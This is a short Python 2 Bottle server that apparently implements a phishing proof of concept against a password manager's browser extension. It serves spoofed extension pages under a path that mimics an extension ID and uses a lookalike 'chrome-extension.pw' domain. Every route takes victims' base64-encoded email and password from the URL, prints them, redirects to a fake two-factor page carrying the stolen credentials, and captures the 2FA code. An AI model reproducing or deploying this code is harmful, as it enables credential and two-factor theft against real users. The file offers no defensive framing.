from bottle import get, run, template, HTTPResponse, static_file
import base64
import urllib

def try_password(b64_auth, try_2fa):
    email, password = base64.b64decode(b64_auth).split(':', 1)
    print "Got {}:{}".format(email, password)

    if password == "correct" or (not try_2fa and password == "2fa"):
        print "correct!!!"
        return HTTPResponse(status=307, headers={'Location':'http://localhost:8000/test.html?y'})
    elif try_2fa and password == "2fa":
        print "two factor required"
        return HTTPResponse(status=307, headers={'Location':'http://test2.chrome-extension.pw/:/debgaelkhoipmbjnhpoblmbacnmmgbeg/lp_toolstrip.html?id=' + urllib.quote(b64_auth)})
    else:
        print "incorrect :("
        return HTTPResponse(status=307, headers={'Location':'http://localhost:8000/test.html?n'})

@get('/p/<b64_auth>')
def basic(b64_auth):
    return try_password(b64_auth, True)

@get('/2fa/<two_factor_code:int>/<b64_auth>')
def two_factor(two_factor_code, b64_auth):
    print "Got two factor code {}".format(two_factor_code)
    return try_password(b64_auth, False)

@get('/:/debgaelkhoipmbjnhpoblmbacnmmgbeg/<filepath:path>')
def server_static(filepath):
    return static_file(filepath, root='.')

run(host='0.0.0.0', port=80)
